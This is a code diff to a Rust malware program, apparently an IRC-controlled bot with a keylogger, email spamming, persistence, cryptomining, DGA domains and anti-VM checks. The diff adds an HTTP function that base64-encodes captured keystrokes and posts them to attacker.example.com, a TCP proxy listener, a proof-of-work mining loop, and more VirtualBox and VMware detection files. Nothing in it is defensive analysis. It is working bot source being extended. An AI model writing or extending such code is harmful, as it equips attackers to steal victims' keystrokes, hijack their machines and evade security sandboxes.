@@ -1,5 +1,5 @@
-use tokio::net::TcpStream;
-use tokio::io::AsyncWriteExt;
+use tokio::net::{TcpListener, TcpStream};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use lettre::{Message, AsyncTransport, Tokio1Executor, AsyncSmtpTransport};
 use lettre::message::header::ContentType;
 use lettre::transport::smtp::authentication::Credentials;
@@ -14,6 +14,7 @@ use rdev::{listen, Event, EventType};
 use chrono::{Datelike, Utc};
 use rand::{Rng, SeedableRng, rngs::StdRng};
 use sha3::{Digest, Sha3_256};
+use base64::{Engine, engine::general_purpose};
 
 const IRC_SERVER: &str = "irc.example.com";      // เปลี่ยนเป็น IRC server ของเรา
 const IRC_NICK: &str = "Hello-User";
@@ -26,8 +27,28 @@ lazy_static! {
     static ref KEYLOGS: Mutex<String> = Mutex::new(String::new());
 }
 
-fn start_socks5_proxy(_port: u16) {
-    println!("SOCKS5 Proxy not implemented in this version");
+async fn start_socks5_proxy(port: u16) {
+    let listener = TcpListener::bind(("0.0.0.0", port)).await.unwrap();
+    println!("TCP Proxy (SOCKS5 placeholder) running on port {}", port);
+
+    loop {
+        let (mut stream, _) = listener.accept().await.unwrap();
+        tokio::spawn(async move {
+            // Simple echo for demonstration; full SOCKS5 implementation would require protocol parsing
+            let mut buf = [0u8; 1024];
+            loop {
+                match stream.read(&mut buf).await {
+                    Ok(0) => break,
+                    Ok(n) => {
+                        if let Err(_) = stream.write_all(&buf[..n]).await {
+                            break;
+                        }
+                    }
+                    Err(_) => break,
+                }
+            }
+        });
+    }
 }
 
 async fn spam_email(target: String, count: u32) -> Result<(), Box<dyn Error + Send + Sync>> {
@@ -92,7 +113,7 @@ async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + Sync>
         }
         "proxy" if parts.len() >= 2 => {
             let port: u16 = parts[1].parse()?;
-            start_socks5_proxy(port);
+            tokio::spawn(start_socks5_proxy(port));
         }
         "download" if parts.len() >= 2 => {
             let url = parts[1].to_string();
@@ -109,7 +130,10 @@ async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + Sync>
         "exfil" => {
             tokio::spawn(async {
                 if let Err(e) = exfil_keylogs().await {
-                    eprintln!("Exfil error: {}", e);
+                    eprintln!("Email exfil error: {}", e);
+                }
+                if let Err(e) = exfil_http().await {
+                    eprintln!("HTTP exfil error: {}", e);
                 }
             });
         }
@@ -154,13 +178,32 @@ async fn persistence() {
 }
 
 async fn start_mining() {
+    let difficulty = 4; // number of leading zero bytes
     loop {
-        let input: [u8; 32] = rand::random();
-        let mut hasher = Sha3_256::new();
-        hasher.update(input);
-        let hash = hasher.finalize();
-        println!("Mining hash: {:?}", hash);
-        sleep(Duration::from_millis(100)).await;
+        let input = rand::random::<[u8; 32]>();
+        let mut nonce = 0u64;
+        loop {
+            let mut hasher = Sha3_256::new();
+            hasher.update(&input);
+            hasher.update(&nonce.to_le_bytes());
+            let hash = hasher.finalize();
+            let mut is_valid = true;
+            for i in 0..difficulty {
+                if hash[i] != 0 {
+                    is_valid = false;
+                    break;
+                }
+            }
+            if is_valid {
+                println!("Mined block with nonce: {}, hash: {:?}", nonce, hash);
+                break;
+            }
+            nonce += 1;
+            if nonce % 100000 == 0 {
+                tokio::task::yield_now().await; // prevent blocking
+            }
+        }
+        sleep(Duration::from_millis(10)).await;
     }
 }
 
@@ -202,6 +245,27 @@ async fn exfil_keylogs() -> Result<(), Box<dyn Error + Send + Sync>> {
     Ok(())
 }
 
+async fn exfil_http() -> Result<(), Box<dyn Error + Send + Sync>> {
+    let logs = tokio::task::spawn_blocking(|| {
+        KEYLOGS.lock().unwrap().clone()
+    }).await.unwrap();
+    if !logs.is_empty() {
+        let encoded = general_purpose::STANDARD.encode(&logs);
+        let client = reqwest::Client::new();
+        let res = client.post("http://attacker.example.com/exfil") // Change to actual endpoint
+            .header("Content-Type", "application/json")
+            .body(format!("{{\"data\":\"{}\"}}", encoded))
+            .send()
+            .await?;
+        if res.status().is_success() {
+            tokio::task::spawn_blocking(|| {
+                KEYLOGS.lock().unwrap().clear();
+            }).await.unwrap();
+        }
+    }
+    Ok(())
+}
+
 fn generate_dga_domains() -> Vec<String> {
     let mut domains = Vec::new();
     let date = Utc::now().date_naive();
@@ -237,6 +301,14 @@ async fn check_anti_vm() -> bool {
         let hklm = RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
         if hklm.open_subkey("SOFTWARE\\VMware, Inc.\\VMware Tools").is_ok() ||
            hklm.open_subkey("SOFTWARE\\Oracle\\VirtualBox Guest Additions").is_ok() {
+            return true;
+        }
+        // Additional file checks
+        use std::path::Path;
+        if Path::new(r"C:\Windows\System32\vmGuestLib.dll").exists() ||
+           Path::new(r"C:\Windows\System32\VBoxGuest.sys").exists() ||
+           Path::new(r"C:\Windows\System32\vm3dgl.dll").exists() ||
+           Path::new(r"C:\Windows\System32\VBoxHook.dll").exists() {
             return true;
         }
     }
